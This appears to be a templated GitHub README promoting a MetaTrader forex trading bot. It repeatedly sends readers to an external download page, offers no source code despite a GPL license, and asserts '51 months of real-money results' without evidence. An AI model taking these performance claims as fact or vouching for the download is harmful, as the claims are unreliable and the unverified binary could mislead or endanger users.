# Apex EA Pro - Forex Trading Expert Advisor 2026

> **Apex EA Pro automates forex trading on MetaTrader 4 and MetaTrader 5, using risk-based lot sizing and placing a hard stop loss on every order.**

[![Forex Expert Advisor](https://img.shields.io/badge/Type-Forex%20Expert%20Advisor-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-MetaTrader%204%20%2F%205-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hallmichaelaogg3171/apex-ea-stop-loss?style=flat-square)](https://github.com/hallmichaelaogg3171/apex-ea-stop-loss)

---

<p align="center">
  <a href="https://hallmichaelaogg3171.github.io/apex-ea-stop-loss/">
    <img src="https://img.shields.io/badge/Download-Apex%20EA%20Pro-brightgreen?style=for-the-badge" alt="Download Apex EA Pro">
  </a>
</p>

> **[Download Apex EA Pro](https://hallmichaelaogg3171.github.io/apex-ea-stop-loss/)**

---

[Download Latest Build](https://hallmichaelaogg3171.github.io/apex-ea-stop-loss/)

---

## Product Summary

Apex EA Pro is an automated forex Expert Advisor built for MetaTrader 4 and MetaTrader 5. It handles forex order execution automatically while maintaining a consistent approach to position sizing through a defined risk model.

The system assigns 0.5% risk to each trade and places a hard stop loss with every order. Its design emphasizes repeatable execution and clearly defined downside limits. The documented performance history includes 51 months of published real-money results.

---

## Core Capabilities

- Executes forex orders automatically
- Runs on MetaTrader 4
- Runs on MetaTrader 5
- Applies a fixed 0.5% risk allocation to each trade
- Adds a hard stop loss to every order
- Determines position size from the selected risk allocation
- Uses consistent trade-risk calculations
- Includes a published 51-month real-money performance history

---

## Installation Guide

1. Get the current Apex EA Pro build from the [download page](https://hallmichaelaogg3171.github.io/apex-ea-stop-loss/).
2. Choose the version corresponding to MetaTrader 4 or MetaTrader 5.
3. Copy the Expert Advisor file into the appropriate `Experts` directory.
4. Restart the trading terminal, or refresh the Navigator panel.
5. Open the forex chart where you want to use Apex EA Pro and attach the Expert Advisor.
6. Check the configuration and terminal settings before turning on automated trading.

The required folder may differ depending on how the terminal was installed. In MetaTrader, use the data-folder command to find the correct installation directory.

---

## Trading Parameters

The documented Apex EA Pro model uses a predefined risk allocation instead of a user-selected trade-risk percentage.

| Setting | Value or behavior |
|---|---|
| Risk allocation | Fixed at 0.5% per trade |
| Stop loss | Hard stop loss on every order |
| Position sizing | Calculated using the configured risk allocation |
| Order handling | Automated forex execution |
| Platform target | MetaTrader 4 or MetaTrader 5 |

Before trading live, inspect the risk controls and order behavior in the supplied build. Configuration behavior may not be identical between the two terminal versions, so settings from one platform should not be assumed to transfer unchanged to the other.

---

## Supported Environments

Apex EA Pro is intended for:

- MetaTrader 4
- MetaTrader 5
- Forex environments with Expert Advisor support

Actual operation can be influenced by broker symbol naming, account conditions, execution policies, spread behavior, and terminal configuration. Run the Expert Advisor in the target environment first, and verify its order placement and stop-loss behavior before connecting it to a live account.

---

## Release Notes

### 2026

- Current Apex EA Pro README release
- Documentation updated for MetaTrader 4 and MetaTrader 5 compatibility
- Fixed risk allocation and hard stop-loss behavior described

---

## Frequently Asked Questions

### What are the installation steps?

Download the build for your platform, place the file in the terminal's `Experts` directory, restart or refresh MetaTrader, and attach Apex EA Pro to the selected chart.

### Is MetaTrader 4 supported alongside MetaTrader 5?

Yes. Apex EA Pro is designed for both MetaTrader 4 and MetaTrader 5. Install the build that corresponds to the terminal in use.

### Is the risk percentage adjustable?

The documented setup assigns a fixed 0.5% allocation per trade. Review the documentation included with the supplied build before modifying any available options.

### Does the Expert Advisor always place a stop loss?

The product specification calls for a hard stop loss on every order. During testing, verify the final order parameters in the MetaTrader environment where the Expert Advisor will operate.

### How can I find new releases?

Visit the [latest download](https://hallmichaelaogg3171.github.io/apex-ea-stop-loss/) to look for a newer build, and read any release information packaged with it.

### Which directory contains the Expert Advisor files?

Place the files in the `Experts` folder within the applicable MetaTrader data directory. The precise location varies according to the terminal installation.

### Can one file be used on both MetaTrader platforms?

Use the platform-specific package when separate files are supplied. MetaTrader 4 and MetaTrader 5 can require different Expert Advisor file formats.

### Where is the performance history documented?

The project profile identifies 51 months of published real-money results. Refer to the materials included with the current build for the relevant records and their context.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
